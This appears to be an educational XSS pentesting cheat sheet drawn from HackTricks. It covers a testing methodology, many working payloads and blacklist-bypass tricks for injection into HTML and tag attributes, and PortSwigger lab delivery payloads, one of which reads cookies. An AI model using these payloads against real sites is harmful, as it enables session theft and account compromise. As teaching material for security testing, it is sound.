# Methodology  
From : [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
1. Check if any value you control (parameters, path, headers?, cookies?) is being reflected in the HTML or used by JS code.  
2. Find the context where it's reflected/used.  
3. If reflected
    1.  Check which symbols can you use and depending on that, prepare the payload:  
        1. In raw HTML:
            1. Can you create new HTML tags?
            2. Can you use events or attributes supporting `javascript:` protocol?
            3. Can you bypass protections?
            4. Is the HTML content being interpreted by any client side JS engine (AngularJS, VueJS, Mavo...), you could abuse a Client Side Template Injection.
            5. If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection?
        2.  Inside a HTML tag:  
            1. Can you exit to raw HTML context?  
            2. Can you create new events/attributes to execute JS code?
            3. Does the attribute where you are trapped support JS execution?
            4. Can you bypass protections?  
        3.  Inside JavaScript code:
            1. Can you escape the `<script>` tag?
            2. Can you escape the string and execute different JS code?
            3. Are your input in template literals ``?
            4. Can you bypass protections?  
        4.  Javascript function being executed
            1. You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If used:
    1. You could exploit a DOM XSS, pay attention how your input is controlled and if your controlled input is used by any sink.  


---
## In raw HTML  
If your input is reflected in the HTML page or you can escape and inject HTML code in this context, first check if you can use `<` to create new tags. Reflect this character to see if it's HTML encoded, deleted, or reflected unchanged.   
If reflected in a tag attribute value, introduce HTML tags to trigger JavaScript execution.   
Some useful methods for executing JavaScript include:
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: `<img , <iframe , <svg , <script` 


### Tags/Events brute-force  
Check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags  


### Custom tags  
If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with `#` to make the page focus on that object and execute the code  

### Blacklist Bypasses  
If some kind of blacklist is being used you could try to bypass it with some silly tricks:
```
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

In case :  

1. Reflected XSS into HTML context with most tags and attributes blocked
>BruteForce all tags by using portswigger list: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet Find out, that payload gives 200 status. Use the next payload, to send it to victim:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
2. Reflected XSS into HTML context with all tags blocked except custom ones  
>In case blocks all HTML tags except custom ones, to send it to victim:
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
3. Reflected XSS with some SVG markup allowed  
```
<svg><animatetransform onbegin=alert(1)> 
```
## In HTML tags attribute  
If your input is reflected inside the value of the attribute of a tag you could try:
1. you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
```
"><script>alert(document.domain)</script>
```
2. If you can escape from the attribute but not from the tag (`>` is encoded or deleted), depending on the tag you could create an event that executes JS code:
```
" autofocus onfocus=alert(document.domain) x="
```
3. If you cannot escape from the attribute (`"` is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: 
```
<a href="javascript:alert(document.domain)">
```
4. If your input is reflected inside *"unexpoitable tags"* you could try the `accesskey` trick to abuse the vuln (you will need some kind of social engineer to exploit this): 
```
" accesskey="x" onclick="alert(1)" x="
```

## In JavaScript code  
